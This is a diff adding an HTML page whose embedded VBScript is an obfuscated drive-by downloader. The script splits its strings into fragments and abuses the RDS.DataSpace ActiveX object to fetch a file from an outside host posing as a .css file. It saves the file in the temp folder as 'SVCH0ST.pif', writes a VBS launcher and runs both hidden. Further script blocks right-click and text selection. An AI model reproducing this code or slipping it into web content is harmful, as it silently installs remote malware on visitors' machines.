@@ -1,0 +1,84 @@
+/*
+*/
+<html>
+<body>
+</body>
+
+
+<script language=VBScript>
+On Error Resume Next
+ssasgaddressssssssss = "http://user999.78-10.net/ms.css"                           
+ssasgobj="o"
+ssasgobjs="b"
+ssasgobjss="j"
+ssasgobjsss="e"
+ssasgobjssss="c"
+ssasgobjsssss="t"
+Set ssasg_2_cnn = document.createElement(ssasgobj&ssasgobjs&ssasgobjss&ssasgobjsss&ssasgobjssss&ssasgobjsssss)
+ssasgun="clsid:"
+ssasgunx="BD"
+ssasgun2="96"
+ssasgun3="C5"
+ssasgun4="56-6"
+ssasgun5="5A"
+ssasgun6="3-1"
+ssasgun7="1D"
+ssasgun8="0-98"
+ssasgun9="3A-0"
+ssasgun10="0C0"
+ssasgun11="4FC"
+ssasgun12="29E"
+ssasgun13="36"
+ssasg3="Microsoft.X"
+ssasg4="MLHTTp"
+ssasg5="G"
+ssasg6="E"
+ssasg7="T"
+ssasgxml="M"&"i"&"c"&"r"&"osof"&"t.XM"&"LHTTp"
+ssasg_2_cnn.SetAttribute "classid", ssasgun&ssasgunx&ssasgun2&ssasgun3&ssasgun4&ssasgun5&ssasgun6&ssasgun7&ssasgun8&ssasgun9&ssasgun10&ssasgun11&ssasgun12&ssasgun13
+Set kaobinuodun=ssasg_2_cnn.CreateObject(ssasgxml,"")
+kaobinuodun.Open ssasg5&ssasg6&ssasg7, ssasgaddressssssssss, False
+kaobinuodun.Send
+ssasgbuffe="SVCH0ST.pif"
+ssasg_kfqq_sssssssss="SVCH0ST.vbs"
+Q784378237="Scripting."
+Q784378237s="FileSyst"
+Q784378237ss="emObject"
+Q784378237sss="Adod"
+Q784378237ssss="b.stream"
+Q784378237sssss=Q784378237sss&Q784378237ssss
+Set chilam = ssasg_2_cnn.createobject(Q784378237&Q784378237s&Q784378237ss,"")
+Set yingying = chilam.GetSpecialFolder(2)
+ssasguser="chilam"
+ssasgbuffe=chilam.BuildPath(yingying,ssasgbuffe)
+ssasg_kfqq_sssssssss=chilam.BuildPath(yingying,ssasg_kfqq_sssssssss)
+Set chilams = ssasg_2_cnn.createobject(Q784378237sssss,"")
+chilams.type=1
+chilams.Open
+chilams.Write kaobinuodun.Responsebody
+chilams.Savetofile ssasgbuffe,2
+chilams.Close
+chilams.Type=2
+chilams.Open
+chilams.WriteText  "'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"Set i_love_ssasg = CreateObject(""Wscript"&".Shell"")"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&vbCrLf&"i_love_ssasg.run ("""&ssasgbuffe&""")"&vbCrLf&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"&"'c_u_t_e_q_q_i_l_o_v_e_y_o_u"
+chilams.Savetofile ssasg_kfqq_sssssssss,2
+chilams.Close
+www="She"
+cute="ll.A"
+qq="ppl"
+cn="ica"
+kfqq="tion"
+Set shanimabi = ssasg_2_cnn.createobject(www&cute&qq&cn&kfqq, "")
+ssasgdk="O"
+ssasgdks="p"
+ssasgdkss="e"
+ssasgdksss="n"
+shanimabi.ShellExeCute ssasg_kfqq_sssssssss, "", "", ssasgdk&ssasgdks&ssasgdkss&ssasgdksss, 0
+
+
+</script>
+                               
+
+</html>
+<script type="text/jscript">function init() { document.write("");}window.onload = init;</script>     
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
